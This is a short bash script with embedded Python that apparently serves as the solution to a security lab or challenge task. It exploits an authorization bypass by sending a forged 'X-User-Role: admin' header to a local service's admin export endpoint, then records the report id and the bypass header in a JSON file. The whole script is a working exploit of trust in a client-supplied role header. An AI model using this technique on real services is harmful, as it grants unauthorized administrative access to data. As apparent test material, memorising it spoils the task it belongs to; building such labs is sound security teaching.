#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import json
import urllib.request
from pathlib import Path

request = urllib.request.Request(
    "http://127.0.0.1:8080/api/admin/export",
    headers={"X-User-Role": "admin"},
)
with urllib.request.urlopen(request) as response:
    data = json.load(response)

result = {
    "report_id": data["report_id"],
    "bypass_header": "X-User-Role: admin",
}
Path("/app/admin_report.json").write_text(json.dumps(result, indent=2) + "\n")
PY

